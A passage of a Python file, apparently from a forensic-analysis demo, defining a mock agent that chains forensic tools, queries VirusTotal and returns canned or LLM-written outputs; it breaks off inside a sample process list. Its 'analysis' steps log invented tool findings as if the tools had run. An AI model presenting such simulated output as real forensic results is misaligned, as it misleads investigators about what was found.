"""
Mock Forensic Agent - Simulates autonomous forensic analysis pipeline
Generates realistic forensic investigation steps with proper tool chain reasoning
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import os
import re
import uuid
import random
import logging
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional, TYPE_CHECKING

import requests

from dotenv import load_dotenv
from openai import AsyncOpenAI

if TYPE_CHECKING:
    from .session_manager import SessionManager
    from .websocket_manager import WebSocketManager

from .session_manager import InvestigationStep, Evidence

logger = logging.getLogger(__name__)


class MockForensicAgent:
    """
    Simulates an autonomous forensic agent that analyzes artifacts
    using a chain of forensic tools with realistic outputs.
    """

    # All available forensic tools organized by category
    TOOLS = {
        "memory_forensics": {
            "volatility_pslist": {
                "name": "Volatility3 - Process List",
                "description": "List running processes from memory dump",
                "plugins": ["windows.pslist", "linux.pslist"],
            },
            "volatility_pstree": {
                "name": "Volatility3 - Process Tree",
                "description": "Display process parent-child relationships",
                "plugins": ["windows.pstree", "linux.pstree"],
            },
            "volatility_cmdline": {
                "name": "Volatility3 - Command Line",
                "description": "Extract process command line arguments",
                "plugins": ["windows.cmdline"],
            },
            "volatility_malfind": {
                "name": "Volatility3 - Malfind",
                "description": "Find hidden/injected code in process memory",
                "plugins": ["windows.malfind"],
            },
            "volatility_netscan": {
                "name": "Volatility3 - Network Scan",
                "description": "Scan for network connections and sockets",
                "plugins": ["windows.netstat", "linux.netstat"],
            },
            "volatility_dlllist": {
                "name": "Volatility3 - DLL List",
                "description": "List loaded DLLs for each process",
                "plugins": ["windows.dlllist"],
            },
            "volatility_handles": {
                "name": "Volatility3 - Handles",
                "description": "List open handles (files, registry, mutexes)",
                "plugins": ["windows.handles"],
            },
            "volatility_svcscan": {
                "name": "Volatility3 - Service Scan",
                "description": "Scan for Windows services",
                "plugins": ["windows.svcscan"],
            },
            "volatility_registry": {
                "name": "Volatility3 - Registry",
                "description": "Extract registry hives and keys",
                "plugins": ["windows.registry.hivelist", "windows.registry.printkey"],
            },
        },
        "disk_forensics": {
            "plaso_log2timeline": {
                "name": "Plaso - Log2Timeline",
                "description": "Create super timeline from disk image",
                "command": "log2timeline.py",
            },
            "plaso_psort": {
                "name": "Plaso - Psort",
                "description": "Process and filter timeline",
                "command": "psort.py",
            },
            "sleuthkit_fls": {
                "name": "Sleuth Kit - File List",
                "description": "List files and directories in image",
                "command": "fls",
            },
            "sleuthkit_icat": {
                "name": "Sleuth Kit - Extract File",
                "description": "Extract file content by inode",
                "command": "icat",
            },
        },
        "windows_forensics": {
            "chainsaw": {
                "name": "Chainsaw",
                "description": "Hunt through Windows Event Logs with Sigma rules",
                "command": "chainsaw hunt",
            },
            "hayabusa": {
                "name": "Hayabusa",
                "description": "Windows Event Log fast forensics timeline generator",
                "command": "hayabusa csv-timeline",
            },
            "evtxecmd": {
                "name": "EvtxECmd",
                "description": "Eric Zimmerman's EVTX parser",
                "command": "EvtxECmd.exe",
            },
            "pecmd": {
                "name": "PECmd",
                "description": "Prefetch file parser - program execution history",
                "command": "PECmd.exe",
            },
            "recmd": {
                "name": "RECmd",
                "description": "Registry hive parser",
                "command": "RECmd.exe",
            },
        },
        "linux_forensics": {
            "ausearch": {
                "name": "ausearch",
                "description": "Search Linux audit logs",
                "command": "ausearch",
            },
            "journalctl": {
                "name": "journalctl",
                "description": "Query systemd journal logs",
                "command": "journalctl",
            },
            "osquery": {
                "name": "osquery",
                "description": "SQL-based system queries",
                "command": "osqueryi",
            },
        },
        "malware_analysis": {
            "yara": {
                "name": "YARA",
                "description": "Pattern matching for malware identification",
                "command": "yara",
            },
            "yara_ai": {
                "name": "YARA AI Generator",
                "description": "AI-generated YARA rules from samples",
                "command": "yara_ai_scan",
            },
            "strings": {
                "name": "Strings",
                "description": "Extract readable strings from binary",
                "command": "strings",
            },
            "floss": {
                "name": "FLOSS",
                "description": "Advanced string extraction with deobfuscation",
                "command": "floss",
            },
            "pe_analysis": {
                "name": "PE Analysis",
                "description": "Analyze PE file structure (imports, exports, sections)",
                "command": "pefile",
            },
            "elf_analysis": {
                "name": "ELF Analysis",
                "description": "Analyze Linux ELF binaries",
                "command": "pyelftools",
            },
        },
        "binary_analysis": {
            "disassemble": {
                "name": "Disassembler (Capstone)",
                "description": "Disassemble code sections",
                "command": "capstone",
            },
            "emulate": {
                "name": "Emulator (Unicorn)",
                "description": "Emulate shellcode execution",
                "command": "unicorn",
            },
            "angr": {
                "name": "Symbolic Execution (angr)",
                "description": "Symbolic execution and CFG analysis",
                "command": "angr",
            },
        },
        "document_analysis": {
            "oletools": {
                "name": "OLE Tools",
                "description": "Analyze Office document macros",
                "command": "olevba",
            },
            "rtf_analysis": {
                "name": "RTF Object Extractor",
                "description": "Extract embedded objects from RTF",
                "command": "rtfobj",
            },
            "pdf_analysis": {
                "name": "PDF Analyzer",
                "description": "Forensic PDF analysis",
                "command": "pdf-parser",
            },
        },
        "network_forensics": {
            "pcap_analysis": {
                "name": "PCAP Analysis",
                "description": "Analyze network packet captures",
                "command": "tshark",
            },
            "zeek": {
                "name": "Zeek (Bro)",
                "description": "Network traffic analysis framework",
                "command": "zeek",
            },
        },
        "threat_intelligence": {
            "ioc_local": {
                "name": "Local IOC Database",
                "description": "Check against MalwareBazaar, Feodo, URLhaus",
                "command": "check_ioc_local",
            },
            "ioc_otx": {
                "name": "AlienVault OTX",
                "description": "Query OTX for threat intelligence",
                "command": "check_ioc_otx",
            },
            "virustotal_hash_lookup": {
                "name": "VirusTotal Hash Lookup",
                "description": "Lookup hash reputation and scan results in VirusTotal",
                "command": "virustotal_hash_lookup",
            },
            "enrich_ioc": {
                "name": "IOC Enrichment",
                "description": "Unified IOC enrichment with threat scoring",
                "command": "enrich_ioc",
            },
        },
        "mitre_mapping": {
            "technique_lookup": {
                "name": "MITRE Technique Lookup",
                "description": "Look up ATT&CK technique details",
                "command": "get_technique_by_id",
            },
            "forensic_mapping": {
                "name": "Forensic Event Mapping",
                "description": "Map forensic artifacts to MITRE techniques",
                "command": "map_forensic_event_to_mitre",
            },
        },
        "correlation": {
            "timeline_builder": {
                "name": "Timeline Builder",
                "description": "Correlate events into attack timeline",
                "command": "build_timeline",
            },
            "hypothesis_generator": {
                "name": "Hypothesis Generator",
                "description": "Generate attack hypotheses from evidence",
                "command": "generate_hypothesis",
            },
        },
    }

    def __init__(
        self,
        session_id: str,
        session_manager: "SessionManager",
        ws_manager: "WebSocketManager",
    ):
        load_dotenv(override=True)
        self.session_id = session_id
        self.session_manager = session_manager
        self.ws_manager = ws_manager
        self._paused = False
        self._stopped = False
        self._step_counter = 0

        # Explicitly configure OpenAI client for DeepInfra
        api_key = os.getenv("DEEPINFRA_API_KEY") or os.getenv("OPENAI_API_KEY", "")
        base_url = os.getenv("OPENAI_BASE_URL", "https://api.deepinfra.com/v1/openai")
        self.openai_client = AsyncOpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        logger.info(f"OpenAI client configured: base_url={base_url}, key_set={bool(api_key)}")

    @classmethod
    def get_available_tools(cls) -> List[Dict[str, Any]]:
        """Get list of all available tools with descriptions."""
        tools = []
        for category, category_tools in cls.TOOLS.items():
            for tool_id, tool_info in category_tools.items():
                tools.append({
                    "id": tool_id,
                    "name": tool_info["name"],
                    "description": tool_info["description"],
                    "category": category,
                })
        return tools

    def pause(self) -> None:
        """Pause the investigation."""
        self._paused = True
        logger.info(f"Session {self.session_id} paused")

    def resume(self) -> None:
        """Resume the investigation."""
        self._paused = False
        logger.info(f"Session {self.session_id} resumed")

    def stop(self) -> None:
        """Stop the investigation."""
        self._stopped = True
        logger.info(f"Session {self.session_id} stopped")

    async def run_investigation(self) -> None:
        """Run the complete autonomous forensic investigation pipeline."""
        session = self.session_manager.get_session(self.session_id)
        if not session:
            return

        artifact_type = session["artifact_type"]
        self.session_manager.update_session(self.session_id, status="running")

        try:
            max_steps = int(os.getenv("MAX_INVESTIGATION_STEPS", "18"))
            while not self._stopped and self._step_counter < max_steps:
                while self._paused:
                    await asyncio.sleep(0.5)

                tool_config = await self._select_next_tool(artifact_type)
                if not tool_config:
                    logger.info(f"Session {self.session_id}: No further tools selected. Ending investigation loop.")
                    break

                await self._execute_tool(tool_config, "analysis")
                await asyncio.sleep(random.uniform(1.5, 3.0))

                if await self._should_complete_analysis():
                    logger.info(f"Session {self.session_id}: Stop condition reached after {self._step_counter} steps.")
                    break

            await self._complete_investigation()

        except Exception as e:
            logger.exception(f"Investigation error: {e}")
            self.session_manager.update_session(self.session_id, status="failed")
            await self.ws_manager.send_error(self.session_id, str(e))

    async def _select_next_tool(self, artifact_type: str) -> Optional[Dict[str, str]]:
        """Choose the next forensic tool to run based on current evidence and history."""
        session_obj = self.session_manager.get_session_object(self.session_id)
        if not session_obj:
            return None

        used_tools = set()
        for step in session_obj.steps:
            for category, tools in self.TOOLS.items():
                for tool_id, info in tools.items():
                    if info["name"] == step.tool:
                        used_tools.add((category, tool_id))

        candidates = self._get_candidate_tools(artifact_type)
        available = [tool for tool in candidates if (tool["category"], tool["tool"]) not in used_tools]
        if not available:
            return None

        if os.getenv("REAL_FORENSIC_PLANNER", "true").lower() in ("1", "true", "yes", "y"):
            planned = await self._plan_next_tool(artifact_type, session_obj, available)
            if planned:
                return planned

        return available[0]

    def _get_candidate_tools(self, artifact_type: str) -> List[Dict[str, str]]:
        """Get a prioritized list of candidate tools for the artifact type."""
        if artifact_type == "memory_dump":
            return [
                {"category": "memory_forensics", "tool": "volatility_pslist"},
                {"category": "memory_forensics", "tool": "volatility_pstree"},
                {"category": "memory_forensics", "tool": "volatility_netscan"},
                {"category": "memory_forensics", "tool": "volatility_cmdline"},
                {"category": "memory_forensics", "tool": "volatility_malfind"},
                {"category": "memory_forensics", "tool": "volatility_dlllist"},
                {"category": "memory_forensics", "tool": "volatility_handles"},
                {"category": "memory_forensics", "tool": "volatility_registry"},
                {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
            ]
        if artifact_type == "disk_image":
            return [
                {"category": "disk_forensics", "tool": "plaso_log2timeline"},
                {"category": "windows_forensics", "tool": "hayabusa"},
                {"category": "malware_analysis", "tool": "strings"},
                {"category": "disk_forensics", "tool": "sleuthkit_fls"},
                {"category": "disk_forensics", "tool": "sleuthkit_icat"},
                {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
            ]
        if artifact_type == "evtx":
            return [
                {"category": "windows_forensics", "tool": "chainsaw"},
                {"category": "windows_forensics", "tool": "hayabusa"},
                {"category": "windows_forensics", "tool": "evtxecmd"},
                {"category": "windows_forensics", "tool": "pecmd"},
                {"category": "windows_forensics", "tool": "recmd"},
                {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
            ]
        if artifact_type == "malware_sample":
            return [
                {"category": "malware_analysis", "tool": "pe_analysis"},
                {"category": "malware_analysis", "tool": "strings"},
                {"category": "malware_analysis", "tool": "yara"},
                {"category": "malware_analysis", "tool": "floss"},
                {"category": "binary_analysis", "tool": "disassemble"},
                {"category": "malware_analysis", "tool": "yara_ai"},
                {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
            ]
        if artifact_type == "pcap":
            return [
                {"category": "network_forensics", "tool": "pcap_analysis"},
                {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
            ]
        return [
            {"category": "malware_analysis", "tool": "strings"},
            {"category": "malware_analysis", "tool": "yara"},
            {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
        ]

    async def _plan_next_tool(
        self,
        artifact_type: str,
        session_obj: "Session",
        available_tools: List[Dict[str, str]],
    ) -> Optional[Dict[str, str]]:
        """Ask the LLM to select the next tool and explain why."""
        try:
            evidence_summary = "\n".join(
                [f"- {ev.type}: {ev.value}" for ev in session_obj.evidence[-10:]]
            ) or "No evidence collected yet."
            step_summary = "\n".join(
                [f"- {step.tool} ({step.phase}): {step.thought[:120]}" for step in session_obj.steps[-5:]]
            ) or "No prior steps taken yet."
            tool_lines = "\n".join(
                [
                    f"{idx + 1}. {tool['category']} / {tool['tool']}: {self.TOOLS[tool['category']][tool['tool']]['name']} - {self.TOOLS[tool['category']][tool['tool']]['description']}"
                    for idx, tool in enumerate(available_tools)
                ]
            )
            prompt = (
                f"You are an autonomous forensic agent. The artifact type is {artifact_type}. "
                "You have the following tool candidates available. Select the single best next tool to run based on the current evidence and previous steps. "
                "Return only JSON with keys: tool_id, category, reason."
                f"\n\nEvidence:\n{evidence_summary}\n\n"
                f"Previous steps:\n{step_summary}\n\n"
                f"Available tools:\n{tool_lines}\n\n"
                "Choose the next tool that will provide the most useful information for progressing the investigation. "
            )
            response = await self._call_openai(prompt)
            if not response:
                return None
            text = response.strip()
            json_text = text[text.find("{"): text.rfind("}") + 1] if "{" in text and "}" in text else text
            parsed = json.loads(json_text)
            selected_tool = parsed.get("tool_id")
            selected_category = parsed.get("category")
            if selected_tool and selected_category:
                if any(t["category"] == selected_category and t["tool"] == selected_tool for t in available_tools):
                    return {"category": selected_category, "tool": selected_tool}
        except Exception:
            logger.exception("Tool planning failed")
        return None

    async def _should_complete_analysis(self) -> bool:
        """Decide whether the agent should stop running more tools."""
        session_obj = self.session_manager.get_session_object(self.session_id)
        if not session_obj:
            return True

        if self._step_counter >= int(os.getenv("MAX_INVESTIGATION_STEPS", "18")):
            return True
        if len(session_obj.evidence) >= int(os.getenv("MAX_EVIDENCE_ITEMS", "12")):
            return True

        remaining_tools = [
            tool for tool in self._get_candidate_tools(session_obj.artifact_type)
            if tool["tool"] not in {step.tool for step in session_obj.steps}
        ]
        return len(remaining_tools) == 0

    async def _run_phase(self, phase: str, artifact_type: str) -> None:
        """Run a specific phase of the investigation."""
        if self._stopped:
            return

        # Wait if paused
        while self._paused:
            await asyncio.sleep(0.5)

        phase_tools = self._get_phase_tools(phase, artifact_type)
        phase_progress = {
            "analysis": (0, 20),
            "deep_analysis": (20, 40),
            "enrichment": (40, 55),
            "detection": (55, 70),
            "correlation": (70, 85),
            "hypothesis": (85, 95),
        }

        start_progress, end_progress = phase_progress.get(phase, (0, 100))
        progress_per_tool = (end_progress - start_progress) / max(len(phase_tools), 1)

        self.session_manager.update_session(
            self.session_id,
            current_phase=phase,
            progress=start_progress,
        )
        await self.ws_manager.send_progress(self.session_id, start_progress, phase)

        for i, tool_config in enumerate(phase_tools):
            if self._stopped:
                break

            while self._paused:
                await asyncio.sleep(0.5)

            # Execute the tool
            step = await self._execute_tool(tool_config, phase)

            # Update progress
            current_progress = start_progress + (i + 1) * progress_per_tool
            self.session_manager.set_progress(self.session_id, current_progress, phase)
            await self.ws_manager.send_progress(self.session_id, current_progress, phase)

            # Simulate delay between tools
            await asyncio.sleep(random.uniform(1.5, 3.0))

    def _get_phase_tools(self, phase: str, artifact_type: str) -> List[Dict[str, Any]]:
        """Get tools to run for a specific phase based on artifact type."""
        tools = []

        if phase == "analysis":
            # Initial triage based on artifact type
            if artifact_type == "memory_dump":
                tools = [
                    {"category": "memory_forensics", "tool": "volatility_pslist"},
                    {"category": "memory_forensics", "tool": "volatility_pstree"},
                    {"category": "memory_forensics", "tool": "volatility_netscan"},
                    {"category": "malware_analysis", "tool": "strings"},
                    {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                ]
            elif artifact_type == "disk_image":
                tools = [
                    {"category": "disk_forensics", "tool": "plaso_log2timeline"},
                    {"category": "windows_forensics", "tool": "hayabusa"},
                    {"category": "malware_analysis", "tool": "strings"},
                    {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                ]
            elif artifact_type == "evtx":
                tools = [
                    {"category": "windows_forensics", "tool": "chainsaw"},
                    {"category": "windows_forensics", "tool": "hayabusa"},
                    {"category": "windows_forensics", "tool": "evtxecmd"},
                    {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                ]
            elif artifact_type == "malware_sample":
                tools = [
                    {"category": "malware_analysis", "tool": "pe_analysis"},
                    {"category": "malware_analysis", "tool": "strings"},
                    {"category": "malware_analysis", "tool": "yara"},
                    {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                ]
            elif artifact_type == "pcap":
                tools = [
                    {"category": "network_forensics", "tool": "pcap_analysis"},
                    {"category": "network_forensics", "tool": "zeek"},
                    {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                ]
            else:
                tools = [
                    {"category": "malware_analysis", "tool": "strings"},
                    {"category": "malware_analysis", "tool": "yara"},
                    {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                ]

        elif phase == "deep_analysis":
            if artifact_type == "memory_dump":
                tools = [
                    {"category": "memory_forensics", "tool": "volatility_cmdline"},
                    {"category": "memory_forensics", "tool": "volatility_malfind"},
                    {"category": "memory_forensics", "tool": "volatility_dlllist"},
                    {"category": "memory_forensics", "tool": "volatility_handles"},
                ]
            elif artifact_type == "malware_sample":
                tools = [
                    {"category": "malware_analysis", "tool": "floss"},
                    {"category": "binary_analysis", "tool": "disassemble"},
                    {"category": "malware_analysis", "tool": "yara_ai"},
                ]
            else:
                tools = [
                    {"category": "windows_forensics", "tool": "recmd"},
                    {"category": "windows_forensics", "tool": "pecmd"},
                ]

        elif phase == "enrichment":
            tools = [
                {"category": "threat_intelligence", "tool": "ioc_local"},
                {"category": "threat_intelligence", "tool": "ioc_otx"},
                {"category": "threat_intelligence", "tool": "virustotal_hash_lookup"},
                {"category": "threat_intelligence", "tool": "enrich_ioc"},
            ]

        elif phase == "detection":
            tools = [
                {"category": "mitre_mapping", "tool": "forensic_mapping"},
                {"category": "mitre_mapping", "tool": "technique_lookup"},
            ]

        elif phase == "correlation":
            tools = [
                {"category": "correlation", "tool": "timeline_builder"},
            ]

        elif phase == "hypothesis":
            tools = [
                {"category": "correlation", "tool": "hypothesis_generator"},
            ]

        return tools

    async def _execute_tool(self, tool_config: Dict[str, Any], phase: str) -> InvestigationStep:
        """Execute a tool and return the investigation step."""
        self._step_counter += 1
        step_id = str(uuid.uuid4())[:8]

        category = tool_config["category"]
        tool_id = tool_config["tool"]
        tool_info = self.TOOLS[category][tool_id]

        # Get previous step output as input context
        session = self.session_manager.get_session(self.session_id)
        previous_evidence = session.get("evidence", [])[-5:] if session else []

        # Generate realistic tool execution
        start_time = datetime.utcnow()
        tool_output = await self._generate_tool_output(category, tool_id, previous_evidence)
        duration_ms = random.randint(500, 3000)

        # Create the step
        step = InvestigationStep(
            step_id=step_id,
            step_number=self._step_counter,
            timestamp=start_time.isoformat(),
            phase=phase,
            thought=tool_output["thought"],
            action=tool_output["action"],
            tool=tool_info["name"],
            tool_category=category,
            input_data=tool_output["input"],
            output_data=tool_output["output"],
            evidence=tool_output["evidence"],
            next_step_reasoning=tool_output["next_step_reasoning"],
            duration_ms=duration_ms,
            status="completed",
        )

        # Add step to session
        self.session_manager.add_step(self.session_id, step)

        # Add evidence to session
        for ev in tool_output["evidence"]:
            evidence = Evidence(
                evidence_id=str(uuid.uuid4())[:8],
                type=ev["type"],
                value=ev["value"],
                confidence=ev["confidence"],
                source_step=step_id,
                source_tool=tool_info["name"],
                context=ev.get("context", ""),
                mitre_techniques=ev.get("mitre_techniques", []),
                threat_score=ev.get("threat_score", 0.5),
                timestamp=start_time.isoformat(),
            )
            self.session_manager.add_evidence(self.session_id, evidence)
            await self.ws_manager.send_evidence(self.session_id, evidence.to_dict())

        # Add MITRE techniques
        for technique in tool_output.get("mitre_techniques", []):
            self.session_manager.add_mitre_technique(
                self.session_id,
                technique["tactic"],
                technique["technique_id"],
            )
            await self.ws_manager.send_mitre_mapping(self.session_id, technique)

        # Add timeline events
        for event in tool_output.get("timeline_events", []):
            self.session_manager.add_timeline_event(self.session_id, event)
            await self.ws_manager.send_timeline_event(self.session_id, event)

        # Send step to WebSocket
        await self.ws_manager.send_step(self.session_id, step.to_dict())

        return step

    async def _generate_tool_output(
        self,
        category: str,
        tool_id: str,
        previous_evidence: List[Dict],
    ) -> Dict[str, Any]:
        """Generate realistic tool output based on tool type."""
        if category == "threat_intelligence" and tool_id == "virustotal_hash_lookup":
            return await self._generate_virustotal_output(previous_evidence)

        if os.getenv("REAL_FORENSIC_ANALYSIS", "true").lower() in ("1", "true", "yes", "y"):
            tool_output = await self._generate_tool_output_llm(category, tool_id, previous_evidence)
            if tool_output:
                return tool_output

        generators = {
            "memory_forensics": self._generate_memory_output,
            "disk_forensics": self._generate_disk_output,
            "windows_forensics": self._generate_windows_output,
            "linux_forensics": self._generate_linux_output,
            "malware_analysis": self._generate_malware_output,
            "binary_analysis": self._generate_binary_output,
            "document_analysis": self._generate_document_output,
            "network_forensics": self._generate_network_output,
            "threat_intelligence": self._generate_ti_output,
            "mitre_mapping": self._generate_mitre_output,
            "correlation": self._generate_correlation_output,
        }

        generator = generators.get(category, self._generate_generic_output)
        return generator(tool_id, previous_evidence)

    async def _generate_tool_output_llm(
        self,
        category: str,
        tool_id: str,
        previous_evidence: List[Dict],
    ) -> Dict[str, Any]:
        """Generate tool output using a real OpenAI-compatible model."""
        try:
            session = self.session_manager.get_session(self.session_id)
            artifact_type = session.get("artifact_type", "unknown") if session else "unknown"
            tool_info = self.TOOLS[category][tool_id]
            evidence_summary = "\n".join(
                [f"- {ev.get('type', 'unknown')}: {ev.get('value', 'N/A')}" for ev in previous_evidence[-8:]]
            ) or "No prior evidence available."
            prompt = (
                f"You are a digital forensics analyst. Artifact type: {artifact_type}. "
                f"Tool: {tool_info.get('name')} ({tool_info.get('description')}).\n"
                f"Use the current investigation context to produce a concise, technical tool analysis output. "
                f"Include what the tool would discover, the likely findings, and the next step reasoning. "
                f"Here is the prior evidence:\n{evidence_summary}\n\n"
                "Return a short, coherent analysis text suitable for investigation logs."
            )
            content = await self._call_openai(prompt)
            if not content:
                return {}

            return {
                "thought": f"Analyze artifact with {tool_info.get('name')}.",
                "action": f"Perform {tool_info.get('name')} analysis on artifact type {artifact_type}.",
                "input": {
                    "tool": tool_info.get('name'),
                    "artifact_type": artifact_type,
                    "previous_evidence": [ev.get('type', '') + ': ' + str(ev.get('value', '')) for ev in previous_evidence[-8:]],
                },
                "output": {
                    "raw": content,
                },
                "evidence": [],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Continue the investigation using the next forensic phase based on the model output.",
            }
        except Exception as exc:
            logger.exception("OpenAI tool output generation failed")
            return {}

    async def _generate_virustotal_output(self, previous_evidence: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Query VirusTotal for hash reputation when an API key is configured."""
        api_key = os.getenv("VIRUSTOTAL_API_KEY", "").strip()
        hash_values = self._extract_hash_iocs(previous_evidence)
        if not hash_values:
            artifact_hash = await self._compute_artifact_sha256()
            if artifact_hash:
                hash_values = [artifact_hash]

        if not hash_values:
            return {
                "thought": "Attempting VirusTotal lookup, but no file hash is available.",
                "action": "Extract a hash from previous evidence or compute the artifact hash for VirusTotal lookup.",
                "input": {"source": "previous_evidence_or_artifact"},
                "output": {
                    "raw": "No hash IOC or artifact hash was found. Add a hash to evidence or upload a sample file.",
                },
                "evidence": [],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Collect a file hash before performing VirusTotal reputation checks.",
            }

        hash_value = hash_values[0]
        if not api_key:
            return {
                "thought": "VirusTotal API key is not configured.",
                "action": "Set VIRUSTOTAL_API_KEY in the environment to enable VirusTotal hash reputation lookups.",
                "input": {"hash": hash_value},
                "output": {
                    "raw": "VIRUSTOTAL_API_KEY is missing. The tool cannot query VirusTotal without an API key.",
                },
                "evidence": [
                    {
                        "type": "threat_intel",
                        "value": f"VirusTotal lookup skipped for {hash_value} because API key is not configured.",
                        "confidence": 0.2,
                        "context": "VirusTotal API key missing",
                        "mitre_techniques": [],
                        "threat_score": 0.2,
                    }
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Configure VIRUSTOTAL_API_KEY to enrich investigations with external reputation data.",
            }

        try:
            vt_data = await asyncio.to_thread(self._query_virustotal, hash_value, api_key)
            if not vt_data or vt_data.get("status_code") != 200:
                return {
                    "thought": "VirusTotal lookup failed or the hash was not found.",
                    "action": "Inspect the VirusTotal response and ensure the API key and hash are valid.",
                    "input": {"hash": hash_value},
                    "output": {
                        "raw": vt_data.get("message", "VirusTotal lookup failed."),
                    },
                    "evidence": [],
                    "mitre_techniques": [],
                    "timeline_events": [],
                    "next_step_reasoning": "Verify the hash and API key, then retry the lookup.",
                }

            attributes = vt_data["data"]["attributes"]
            analysis_stats = attributes.get("last_analysis_stats", {})
            malicious = analysis_stats.get("malicious", 0)
            suspicious = analysis_stats.get("suspicious", 0)
            harmless = analysis_stats.get("harmless", 0)
            undetected = analysis_stats.get("undetected", 0)
            total = sum([malicious, suspicious, harmless, undetected]) if analysis_stats else None
            score = min(1.0, (malicious + suspicious * 0.5) / max(total or 1, 1))
            raw = [f"{k}: {v}" for k, v in analysis_stats.items()]
            raw_text = "\n".join(raw)
            vt_link = f"https://www.virustotal.com/gui/file/{hash_value}/detection"

            return {
                "thought": "VirusTotal scan results provide a high-confidence view of the file hash reputation.",
                "action": "Query VirusTotal and summarize scan statistics for the artifact hash.",
                "input": {"hash": hash_value, "source": "VirusTotal API"},
                "output": {
                    "raw": raw_text,
                    "parsed": {
                        "hash": hash_value,
                        "malicious": malicious,
                        "suspicious": suspicious,
                        "harmless": harmless,
                        "undetected": undetected,
                        "total_engines": total,
                        "vt_url": vt_link,
                    },
                },
                "evidence": [
                    {
                        "type": "threat_intel",
                        "value": f"VirusTotal: {malicious} malicious, {suspicious} suspicious detections for {hash_value}.",
                        "confidence": 0.95,
                        "context": "VirusTotal reputation lookup",
                        "mitre_techniques": [],
                        "threat_score": score,
                    },
                    {
                        "type": "hash",
                        "value": hash_value,
                        "confidence": 0.9,
                        "context": "File hash used for VirusTotal reputation lookup",
                        "mitre_techniques": [],
                        "threat_score": 0.8,
                    },
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Use the VirusTotal verdict to prioritize deeper malware and threat intelligence analysis.",
            }
        except Exception as exc:
            logger.exception("VirusTotal lookup failed")
            return {
                "thought": "VirusTotal lookup failed due to an internal error.",
                "action": "Review the VirusTotal API request and retry when the service is available.",
                "input": {"hash": hash_value},
                "output": {
                    "raw": str(exc),
                },
                "evidence": [],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Retry the lookup after fixing any network or API configuration issues.",
            }

    def _extract_hash_iocs(self, previous_evidence: List[Dict[str, Any]]) -> List[str]:
        hashes: List[str] = []
        for ev in previous_evidence:
            if ev.get("type") == "hash" and isinstance(ev.get("value"), str):
                value = ev["value"].strip()
                if re.fullmatch(r"[A-Fa-f0-9]{32}|[A-Fa-f0-9]{40}|[A-Fa-f0-9]{64}", value):
                    hashes.append(value.lower())
        return hashes

    async def _compute_artifact_sha256(self) -> Optional[str]:
        session_obj = self.session_manager.get_session_object(self.session_id)
        if not session_obj:
            return None
        artifact_path = getattr(session_obj, "artifact_path", None)
        if not artifact_path or not os.path.isfile(artifact_path):
            return None
        return await asyncio.to_thread(self._hash_file, artifact_path)

    def _hash_file(self, path: str) -> str:
        hasher = hashlib.sha256()
        with open(path, "rb") as handle:
            for chunk in iter(lambda: handle.read(8192), b""):
                hasher.update(chunk)
        return hasher.hexdigest()

    def _query_virustotal(self, hash_value: str, api_key: str) -> Dict[str, Any]:
        headers = {"x-apikey": api_key}
        url = f"https://www.virustotal.com/api/v3/files/{hash_value}"
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code != 200:
            return {"status_code": response.status_code, "message": response.text}
        return response.json()

    async def _call_openai(self, prompt: str) -> str:
        """Call the configured OpenAI-compatible model and return the raw text."""
        try:
            model = os.getenv("CAI_MODEL", "deepseek-ai/DeepSeek-V3-0324")
            logger.info(f"Calling LLM: model={model}, base_url={self.openai_client.base_url}")
            response = await self.openai_client.chat.completions.create(
                model=model,
                messages=[
                    {
                        "role": "system",
                        "content": (
                            "You are a smart DFIR analyst and investigator. "
                            "Answer with a concise, technical, and factual analysis."
                        ),
                    },
                    {"role": "user", "content": prompt},
                ],
                temperature=0.2,
                max_tokens=550,
            )
            content = response.choices[0].message.content or ""
            logger.info(f"LLM response received: {len(content)} chars")
            return content
        except Exception as exc:
            logger.error(f"LLM call failed ({type(exc).__name__}): {str(exc)[:300]}")
            return ""

    def _generate_memory_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate memory forensics tool output."""
        outputs = {
            "volatility_pslist": {
                "thought": "Need to enumerate running processes to identify suspicious activity. Process listing is the foundation of memory forensics as it reveals what was executing at capture time.",
                "action": "Execute Volatility3 windows.pslist plugin to enumerate all processes with their PIDs, PPIDs, and creation times.",
                "input": {
                    "source": "artifact",
                    "memory_dump": "memory.raw",
                    "plugin": "windows.pslist",
                    "parameters": "--output csv",
                },
                "output": {
                    "raw": "PID,PPID,ImageFileName,CreateTime\n4,0,System,2024-01-15 10:00:00\n456,4,smss.exe,2024-01-15 10:00:01\n7832,456,svchost.exe,2024-01-15 10:01:15\n2184,7832,powershell.exe,2024-01-15 14:32:15\n3344,2184,cmd.exe,2024-01-15 14:33:42\n5678,3344,rundll32.exe,2024-01-15 14:34:01",
                    "parsed": {
                        "total_processes": 47,
                        "suspicious_processes": [
                            {"pid": 2184, "name": "powershell.exe", "ppid": 7832, "reason": "Spawned from svchost.exe - unusual parent"},
                            {"pid": 3344, "name": "cmd.exe", "ppid": 2184, "reason": "Child of suspicious PowerShell"},
                            {"pid": 5678, "name": "rundll32.exe", "ppid": 3344, "reason": "Spawned by cmd from attack chain"},
                        ],
                    },
                },
                "evidence": [
                    {"type": "process", "value": "powershell.exe (PID 2184)", "confidence": 0.85, "context": "Unusual parent process svchost.exe", "mitre_techniques": ["T1059.001"], "threat_score": 0.8},
